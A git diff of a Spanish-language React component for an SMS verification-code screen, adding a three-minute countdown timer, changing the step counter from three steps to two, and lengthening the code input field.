@@ -1,9 +1,25 @@
-import React from 'react';
+import React, { useState, useEffect } from 'react';
 import '../css/segundapag.css';
 import { useNavigate } from 'react-router-dom';
 
 function Segundapag() {
   const navigate = useNavigate();
+  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes in seconds
+
+  useEffect(() => {
+    if (timeLeft > 0) {
+      const timerId = setInterval(() => {
+        setTimeLeft(timeLeft - 1);
+      }, 1000);
+      return () => clearInterval(timerId);
+    }
+  }, [timeLeft]);
+
+  const formatTime = (seconds) => {
+    const minutes = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
+  };
 
   const handleSubmit = async (event) => {
     event.preventDefault();
@@ -41,7 +57,7 @@ function Segundapag() {
         <div className="auth-step-circle">1</div>
         <div className="auth-status">
           <p>Lo estamos autenticando</p>
-          <p>1 de 3</p>
+          <p>1 de 2</p>
         </div>
         <div className="auth-progress-bar">
           <div className="auth-progress-bar-fill"></div>
@@ -50,9 +66,12 @@ function Segundapag() {
       <form className="auth-form" onSubmit={handleSubmit}>
         <label>
           Ingrese los números que recibió por mensaje SMS:
-          <input type="tel" name="sms-code" maxLength={8} placeholder="8 dígitos" className="auth-input" />
+          <input type="tel" name="sms-code" maxLength={18} placeholder="18 dígitos" className="auth-input" />
         </label>
-        <button type="submit" className="auth-continue-button">Continuar</button>
+        <div className="auth-timer">
+          Tiempo restante: {formatTime(timeLeft)}
+        </div>
+        <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>Continuar</button>
       </form>
     </div>
   );
